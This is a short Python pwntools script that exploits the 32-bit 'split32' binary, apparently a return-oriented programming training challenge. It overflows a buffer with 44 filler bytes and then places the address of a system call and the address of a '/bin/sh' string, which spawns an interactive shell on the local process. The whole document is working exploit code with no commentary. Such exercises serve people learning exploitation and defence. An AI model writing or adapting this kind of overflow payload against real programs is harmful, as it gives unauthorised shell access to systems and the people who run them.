from pwn import *

r = process("./split32")
#gdb.attach(r, api= True)

binsh = 0x0804a030
sys = 0x0804861a
ret =0x0804837e

payload = b'A'*44  + p32(sys) + p32(binsh)

r.sendline(payload)

r.interactive()